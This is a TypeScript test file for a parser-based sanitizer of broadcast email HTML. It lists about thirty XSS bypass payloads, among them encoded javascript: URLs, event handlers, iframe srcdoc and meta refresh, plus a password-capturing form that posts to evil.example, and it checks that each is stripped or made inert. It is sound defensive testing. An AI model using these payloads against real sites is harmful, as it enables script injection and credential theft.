// RD-COMMS-P2-C — the broadcast email sanitizer is PARSER-based (htmlparser2 via sanitize-html).
// Every bypass class the Phase 2 audit found against the old regex sanitizer is pinned here: the
// payload is either rejected (`stripped`) or reduced to inert text — and in no case does the
// clean output contain an executable element, an event handler or a dangerous URL, even after it
// is dropped into the surrounding email markup.

import { describe, it, expect } from 'vitest'
import { sanitizeBroadcastHtml } from '@/lib/broadcasts/sanitize'

/** Nothing executable may survive in the clean output. */
function assertInert(clean: string) {
  expect(clean).not.toMatch(/<\s*(script|style|iframe|frame|object|embed|svg|math|meta|base|link|form|input|button|textarea|select|img|video|audio|source|template)\b/i)
  // Attribute NAMES only: text inside a quoted attribute value (e.g. an escaped payload in a
  // title) is inert data, so values are blanked before the names are inspected.
  const names = clean.replace(/"[^"]*"/g, '""').replace(/'[^']*'/g, "''")
  expect(names).not.toMatch(/<[^>]*\son[a-z]+\s*=/i)                 // no event-handler attribute
  expect(names).not.toMatch(/<[^>]*\s(srcdoc|formaction|http-equiv|style|src|action)\s*=/i)
  expect(clean).not.toMatch(/(href|src|action|formaction|data)\s*=\s*["']?\s*(javascript|vbscript|data):/i)
}
/** Simulates the email shell closing the body (`…</td>`), which is how an unclosed tag used to be completed. */
const inShell = (clean: string) => `<td>${clean}\n</td>`

describe('known bypass classes from the Phase 2 audit', () => {
  const cases: Array<[string, string]> = [
    ['slash attribute separator (img)', '<img/src/onerror=alert(document.domain)>'],
    ['slash attribute separator (svg)', '<svg/onload=alert(1)>'],
    ['slash separator on a link with javascript:', '<a/href=javascript:alert(1)>Click</a>'],
    ['iframe with slash', '<iframe/src=https://evil.example>'],
    ['iframe srcdoc', '<iframe/srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">'],
    ['form + formaction', '<form/action=https://evil.example><input/name=password><button/formaction=https://evil.example>Login</button></form>'],
    ['meta refresh', '<meta/http-equiv="refresh"/content="0;url=https://evil.example">'],
    ['base href', '<base/href=https://evil.example/>'],
    ['style / object / embed', '<style/>p{x:y}</style><object/data=https://e><embed/src=https://e>'],
    ['unclosed trailing tag', 'Hello <img src=x onerror=alert(1) '],
    ['script', '<p>hi</p><script>alert(1)</script>'],
    ['nested script split', '<scr<script>ipt>alert(1)</script>'],
    ['event handler on an allowed tag', '<p onclick="alert(1)">x</p>'],
    ['mixed-case unquoted handler', '<B ONMOUSEOVER=alert(1)>x</B>'],
    ['svg with script', '<svg><script>alert(1)</script></svg>'],
    ['math/xlink', '<math><a xlink:href="javascript:alert(1)">x</a></math>'],
    ['entity-encoded javascript scheme', '<a href="jav&#x61;script:alert(1)">x</a>'],
    ['decimal-encoded scheme', '<a href="&#106;&#97;vascript:alert(1)">x</a>'],
    ['tab inside the scheme', '<a href="java\tscript:alert(1)">x</a>'],
    ['newline inside the scheme', '<a href="java\nscript:alert(1)">x</a>'],
    ['leading whitespace before scheme', '<a href="  javascript:alert(1)">x</a>'],
    ['data: URL', '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>'],
    ['vbscript: URL', '<a href="vbscript:msgbox(1)">x</a>'],
    ['style attribute', '<p style="background:url(javascript:alert(1))">x</p>'],
    ['comment-hidden payload', '<!-- <script>alert(1)</script> --><p>x</p>'],
    ['CDATA', '<![CDATA[<script>alert(1)</script>]]>'],
    ['attribute breaking out of quotes', '<a href="https://ok.test/" title="x" onmouseover="alert(1)">x</a>'],
    ['quote-in-attribute injection', `<a title='"><img src=x onerror=alert(1)>'>x</a>`],
    ['template element', '<template><img src=x onerror=alert(1)></template>'],
  ]
  for (const [name, payload] of cases) {
    it(`${name} — never executable`, () => {
      const r = sanitizeBroadcastHtml(payload)
      assertInert(r.clean)
      assertInert(inShell(r.clean))
    })
  }

  it('every payload that carried a dangerous element/attribute is REPORTED (the route then rejects it)', () => {
    for (const p of [
      '<img/src/onerror=alert(1)>', '<svg/onload=alert(1)>', '<iframe/src=https://e>', '<meta/http-equiv=refresh>',
      '<base/href=https://e/>', '<form/action=https://e></form>', '<script>alert(1)</script>', '<p onclick=alert(1)>x</p>',
      '<a href="javascript:alert(1)">x</a>', '<a href="jav&#x61;script:alert(1)">x</a>', '<a href="data:text/html,x">x</a>',
      '<!-- x --><p>y</p>', '<p style="color:red">x</p>',
    ]) {
      expect(sanitizeBroadcastHtml(p).stripped, p).toBe(true)
    }
  })

  it('an unclosed trailing tag is reduced to escaped TEXT — the shell can no longer complete it', () => {
    const r = sanitizeBroadcastHtml('Hello <img src=x onerror=alert(1) ')
    expect(r.clean).not.toContain('<img')
    expect(inShell(r.clean)).not.toMatch(/<img/i)
  })
})

describe('legitimate formatting is preserved unchanged', () => {
  it('the supported formatting round-trips and is not reported as stripped', () => {
    const html = '<h2>Race day</h2><p>Hello <strong>there</strong>, <em>see</em> <u>you</u> <s>soon</s>.</p>'
      + '<ul><li>One</li><li>Two</li></ul><ol><li>A</li></ol><blockquote>Quote</blockquote><hr><br>'
      + '<div><span>x</span></div><p><a href="https://registerdesk.in/events/x?a=1&amp;b=2" title="Event">Open</a></p>'
    const r = sanitizeBroadcastHtml(html)
    expect(r.stripped).toBe(false)
    expect(r.clean).toContain('<a href="https://registerdesk.in/events/x?a=1&amp;b=2" title="Event">Open</a>')
    expect(r.clean).toContain('<h2>Race day</h2>')
    expect(r.clean).toContain('<ul><li>One</li><li>Two</li></ul>')
  })

  it('plain text with < & > is kept as text (escaped), never mistaken for markup', () => {
    const r = sanitizeBroadcastHtml('Prize > ₹500 & entry < 5 mins')
    expect(r.clean).not.toMatch(/<[a-z]/i)
    expect(r.clean).toContain('&amp;')
  })

  it('http links remain allowed; relative and protocol-relative links are removed', () => {
    expect(sanitizeBroadcastHtml('<a href="http://x.test">x</a>').clean).toContain('href="http://x.test"')
    expect(sanitizeBroadcastHtml('<a href="/relative">x</a>').clean).not.toContain('href')
    expect(sanitizeBroadcastHtml('<a href="//e.test">x</a>').clean).not.toContain('href')
  })
})
